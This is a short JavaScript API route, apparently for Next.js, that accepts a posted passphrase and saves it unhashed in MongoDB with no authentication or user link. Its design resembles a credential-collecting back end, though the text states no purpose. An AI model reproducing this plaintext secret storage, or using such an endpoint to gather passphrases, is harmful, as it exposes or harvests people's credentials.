import mongoose from 'mongoose';

// Define the Passphrase schema
const PassphraseSchema = new mongoose.Schema({
  passphrase: String,
  createdAt: { type: Date, default: Date.now }
});

// Get the model (or create if doesn't exist)
const Passphrase = mongoose.models.Passphrase || mongoose.model('Passphrase', PassphraseSchema);

// Helper function to connect to MongoDB
const connectDB = async () => {
  try {
    if (mongoose.connection.readyState === 1) {
      return;
    }
    await mongoose.connect(process.env.MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 45000,
    });
    console.log('Connected to MongoDB successfully');
  } catch (error) {
    console.error('MongoDB connection error:', error);
    throw new Error('Failed to connect to database');
  }
};

export async function POST(request) {
  try {
    // Connect to database
    await connectDB();

    // Get the passphrase from request body
    const { passphrase } = await request.json();

    if (!passphrase) {
      return new Response(JSON.stringify({ error: 'Passphrase is required' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
      });
    }

    // Create new passphrase document
    const newPassphrase = new Passphrase({ passphrase });
    await newPassphrase.save();

    return new Response(JSON.stringify({ message: 'Passphrase saved successfully' }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });

  } catch (error) {
    console.error('API error:', error);
    return new Response(JSON.stringify({ error: 'Internal server error' }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
} 